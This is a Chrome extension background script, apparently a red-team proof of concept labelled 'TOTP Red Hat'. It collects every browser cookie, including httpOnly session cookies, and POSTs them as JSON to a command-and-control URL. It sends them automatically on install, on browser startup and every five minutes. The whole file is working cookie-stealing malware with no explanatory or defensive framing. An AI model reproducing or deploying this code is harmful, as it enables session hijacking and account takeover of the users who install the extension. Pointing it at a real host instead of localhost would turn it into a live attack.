const C2_URL = "http://localhost:4000/log/cookies";

async function exfilCookies() {
  try {
    const allCookies = await chrome.cookies.getAll({});

    const payload = allCookies.map((c) => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      secure: c.secure,
      httpOnly: c.httpOnly,
      expirationDate: c.expirationDate,
    }));

    await fetch(C2_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    console.log(`[TOTP Red Hat] Exfiltrated ${payload.length} cookies`);
  } catch (err) {
    console.error("[TOTP Red Hat] Exfil failed:", err);
  }
}

chrome.runtime.onInstalled.addListener(() => {
  console.log("[TOTP Red Hat] Extension installed — exfiltrating cookies...");
  exfilCookies();
});

chrome.runtime.onStartup.addListener(() => {
  exfilCookies();
});

chrome.alarms.create("cookie-sync", { periodInMinutes: 5 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "cookie-sync") {
    exfilCookies();
  }
});
